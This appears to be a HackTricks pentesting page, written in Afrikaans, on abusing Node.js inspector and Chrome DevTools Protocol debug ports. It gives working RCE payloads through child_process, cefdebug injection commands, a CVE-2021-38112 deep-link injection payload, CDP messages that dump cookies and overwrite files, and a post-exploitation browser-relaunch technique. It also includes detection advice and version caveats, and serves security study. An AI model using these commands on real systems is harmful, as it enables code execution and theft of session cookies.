# Node inspector/CEF debug misbruik

{{#include ../../banners/hacktricks-training.md}}

Historiese praktiese voorbeelde sluit die Multimaster-walkthrough en die CVE-2019-1414 Visual Studio Code debugger-aanval in; gebruik hulle as weergawe-spesifieke konteks eerder as om aan te neem dat elke huidige Electron- of Chromium-teiken dieselfde primitives blootstel.<sup>[[1]](#references)[[3]](#references)</sup>

## Basiese Inligting

[Volgens die docs](https://nodejs.org/learn/getting-started/debugging): Wanneer dit met die `--inspect`-switch begin word, luister ’n Node.js-proses vir ’n debugging client. By **verstek** sal dit luister by host en port **`127.0.0.1:9229`**. Elke proses kry ook ’n **unieke** **UUID** toegeken.<sup>[[4]](#references)</sup>

Inspector clients moet die host address, port en UUID ken en spesifiseer om te verbind. ’n Volledige URL sal ongeveer soos `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` lyk.<sup>[[4]](#references)</sup>

> [!WARNING]
> Omdat die **debugger volle toegang tot die Node.js execution environment het**, kan ’n malicious actor wat aan hierdie port kan verbind moontlik arbitrary code namens die Node.js-proses uitvoer (**potential privilege escalation**).<sup>[[4]](#references)</sup>

Daar is verskeie maniere om ’n inspector te begin:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wanneer jy 'n geïnspekteerde proses begin, sal iets soos die volgende verskyn:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Prosesse gebaseer op **CEF** (**Chromium Embedded Framework**) kan 'n debugger blootstel met `--remote-debugging-port=9222`. Dit stel die webblaaier bloot deur die [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) eerder as 'n Node.js-inspekteur, dus is Node.js-`process`-gebaseerde payloads nie by verstek direk toepaslik nie.<sup>[[2]](#references)[[5]](#references)</sup>

Wanneer jy 'n webblaaier met debugging geaktiveer begin, sal iets soos die volgende verskyn:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Enumerering en aandryf van ’n CDP-eindpunt

Die HTTP discovery-eindpunte onderskei die **browser** WebSocket van individuele **target**- (tab, worker, extension, ens.) WebSockets. Doen ’n navraag na `/json/version` vir die browser-eindpunt en `/json/list` vir targets; die teruggestuurde `webSocketDebuggerUrl`-waardes kan dan direk aangedryf word met CDP se JSON-RPC-agtige boodskappe.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
Byvoorbeeld, verbind met `websocat "$BROWSER_WS"` en stuur `{"id":1,"method":"Target.getTargets"}` of `{"id":2,"method":"Storage.getCookies"}`. Op ’n bladsyteiken (`websocat "$PAGE_WS"`), voer `Runtime.evaluate` in daardie renderer uit en gee `Page.captureScreenshot` ’n base64-geënkodeerde skermskoot terug. `document.cookie` kan nie `HttpOnly`-cookies openbaar nie, terwyl `Storage.getCookies` die browser se cookiestoor navraag doen.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Blaaiers, WebSockets en same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webwerwe wat in ’n webblaaier oopgemaak word, kan WebSocket- en HTTP-requests binne die blaaier se sekuriteitsmodel maak. ’n **Aanvanklike HTTP-verbinding** is nodig om ’n **unieke debugger-sessie-ID te verkry**. Die **same-origin-policy** **verhoed** dat webwerwe **hierdie HTTP-verbinding** kan maak. Vir bykomende sekuriteit teen [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** verifieer Node.js dat die **'Host'-headers** vir die verbinding óf ’n **IP-adres** óf presies **`localhost`** spesifiseer.<sup>[[4]](#references)</sup>

> [!TIP]
> Hierdie **sekuriteitsmaatreël voorkom dat die inspector uitgebuit word** om kode uit te voer deur **bloot ’n HTTP-request te stuur** (wat gedoen kan word deur ’n SSRF-vuln uit te buit).<sup>[[4]](#references)</sup>

### Begin van inspector in lopende prosesse

Jy kan die **sein SIGUSR1** na ’n lopende nodejs-proses stuur om dit die **inspector** op die verstekpoort te laat begin. Let egter daarop dat jy voldoende voorregte moet hê, dus kan dit jou **bevoorregte toegang tot inligting binne die proses** gee, maar nie ’n direkte privilege escalation nie.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Dit is nuttig in containers omdat **die proses afskakel en ’n nuwe een begin** met `--inspect` **nie ’n opsie is nie**, aangesien die **container** saam met die proses **gestop sal word**.<sup>[[6]](#references)</sup>

### Koppel aan inspector/debugger

Om aan ’n **Chromium-gebaseerde browser** te koppel, kan die `chrome://inspect`- of `edge://inspect`-URL’s onderskeidelik vir Chrome of Edge gebruik word. Deur op die Configure-knoppie te klik, moet daar verseker word dat die **teikenhost en -poort** korrek gelys is. Die afbeelding wys ’n Remote Code Execution (RCE)-voorbeeld:<sup>[[2]](#references)[[4]](#references)</sup>

![Nadat ’n URL om toegang tot die debugger te verkry verskyn het, bv. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Koppel aan inspector/debugger: Om aan ’n Chromium-gebaseerde browser te koppel, ...](<../../images/image (674).png>)

Met die **command line** kan jy met die volgende aan ’n debugger/inspector koppel:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Die tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) laat toe om **inspectors** wat plaaslik loop te **vind** en **code** daarin te **inject**.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Let daarop dat **NodeJS RCE exploits nie sal werk nie** indien dit via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) aan 'n blaaier gekoppel is (jy moet die API nagaan om interessante dinge te vind om daarmee te doen).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Indien jy hier beland het om uit te vind hoe om [**RCE vanuit 'n XSS in Electron te verkry, kyk asseblief na hierdie bladsy.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Sommige algemene maniere om **RCE** te verkry wanneer jy aan 'n Node **inspector** kan **connect**, is om iets soos die volgende te gebruik (dit lyk asof dit **nie sal werk met 'n verbinding met Chrome DevTools protocol nie**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Jy kan die API hier nagaan: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In hierdie afdeling sal ek net interessante dinge lys wat ek gevind het wat mense gebruik het om hierdie protocol te exploit.

### Chrome 136+ default-profile-beperking

Vanaf **Chrome 136** ignoreer Chrome `--remote-debugging-port` en `--remote-debugging-pipe` wanneer hulle die **default Chrome-data-gids** teiken. Die switch moet gekombineer word met ’n nie-standaard `--user-data-dir`, waarvan die afsonderlike encryption key en geïsoleerde browser state voorkom dat die eenvoudige flag-gebaseerde tegniek die gebruiker se normale authenticated profile blootstel. Daar moet nie sonder verification aanvaar word dat hierdie Chrome-spesifieke beperking ouer Chrome-builds, Chrome for Testing, Electron/CEF applications of ander Chromium-derivatives dek nie.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Dus, om 'n huidige Chrome-proses te sien wat slegs met `--remote-debugging-port` geloods is, **bewys nie** dat CDP aktief geword het nie. Bevestig die listener en `/json/version`, en bepaal watter profiel dit werklik ondersteun.<sup>[[14]](#references)</sup>

### Parameter Injection via Deep Links

In die [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) het Rhino security ontdek dat 'n toepassing gebaseer op CEF 'n pasgemaakte **UR**I in die stelsel geregistreer het (workspaces://index.html) wat die volledige URI ontvang het en daarna die CEF-gebaseerde toepassi**on** met 'n konfigurasie geloods het wat gedeeltelik uit daardie URI saamgestel is.<sup>[[8]](#references)</sup>

Daar is ontdek dat die URI-parameters URL decoded is en gebruik is om die CEF-basistoepassing te loods, wat 'n gebruiker toegelaat het om die vlag **`--gpu-launcher`** in die **command line** te **inject** en arbitrêre dinge uit te voer.<sup>[[8]](#references)</sup>

Dus, 'n payload soos:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Sal `calc.exe` uit.<sup>[[8]](#references)</sup>

### Oorskryf lêers

Verander die vouer waar **afgelaaide lêers gestoor gaan word** en laai ’n lêer af om die toepassing se gereeld gebruikte **bronkode** met jou **kwaadwillige kode** te **oorskryf**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE en exfiltrasie

STAR Labs het getoon dat blootgestelde WebDriver/CDP-dienste willekeurige lêerleesbewerkings en RCE kan moontlik maak; DNS rebinding kan die exploit chain in sommige konfigurasies voltooi.<sup>[[9]](#references)</sup>

Vir bykomende historiese browser-automation- en Chromium-sekuriteitsgevalle, sien die Counter WebDriver-write-up en Project Zero-kwessies 773, 1742 en 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Enabling CDP binne 'n aktiewe Chromium-proses

Op Windows het [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) gedemonstreer dat die command-line-beperking nie die enigste manier is om CDP te aktiveer nie: kode wat reeds in staat is om in 'n bestaande `msedge.exe` in te spuit, kan Chromium se nie-geëksporteerde `content::DevToolsAgentHost::StartRemoteDebuggingServer` aanroep en die geauthentiseerde aktiewe profiel blootstel sonder om die browser te herbegin.<sup>[[15]](#references)</sup>

Die gedemonstreerde ketting spuit 'n DLL in met `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, bepaal interne Edge-simbole (eers vanaf PDB's en daarna met weergawe-spesifieke byte-signatures), subclass die browser-venster, en plaas 'n boodskap sodat die finale server-start-aanroep op die browser se **UI thread** uitgevoer word. Die socket word aan loopback gebind, waarna normale CDP-primitives cookies kan terugwin, tabs kan vaslê, network traffic kan inspekteer, of JavaScript in geauthentiseerde bladsye kan evalueer.<sup>[[15]](#references)</sup>

> [!WARNING]
> Dit is 'n **post-compromise/process-injection**-tegniek, nie 'n ongeauthentiseerde network bypass nie. Dit is sterk build-afhanklik omdat die relevante C++-simbole nie geëksporteer word nie en signatures ná browser-opdaterings kan verander.<sup>[[15]](#references)</sup>

Vir opsporing, moenie slegs op `--remote-debugging-*` command-line-telemetrie staatmaak nie: korreleer ook ongewone handles en geheuebewerkings teen browser-prosesse (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread creation), DLL-injection, en onverwagte loopback-listening sockets wat deur Chrome/Edge besit word.<sup>[[15]](#references)</sup>

### Post-Exploitation

In 'n werklike omgewing en **nadat** 'n gebruiker se rekenaar wat 'n Chromium-gebaseerde browser gebruik, gekompromitteer is, was 'n historiese tegniek om die browser met debugging geaktiveer te herbegin en die loopback-poort aan te stuur. Dit kan die slagoffer se browsing state blootstel op produkte/builds wat steeds die gekose profiel aanvaar, maar Chrome 136+ sal dit nie teen sy verstek-data-directory toepas nie.<sup>[[7]](#references)[[14]](#references)</sup>

Die oorspronklike herbegin-opdrag word hieronder vir ouer/weergawespesifieke teikens behou. Die tweede opdrag is die ondersteunde huidige-Chrome-vorm, maar dit skep 'n geïsoleerde profiel eerder as om die slagoffer se normale geauthentiseerde state te heropen.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
Vir macOS-spesifieke Chromium relaunch, extension en CDP tradecraft, sien [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger-inspeksie- en exploitation-tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution in Visual Studio Code via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Aan die gang kom](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Misbruik van Chrome se debugging-funksie om blaaisessies op afstand waar te neem en te beheer](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Praat jy met my? - WebDriver RCE via DNS Rebinding en CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Van Bot tot RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Veranderinge aan remote debugging switches om security te verbeter - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injecting CDP into a Running Edge Browser: A Deep Dive into Runtime Browser Instrumentation](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
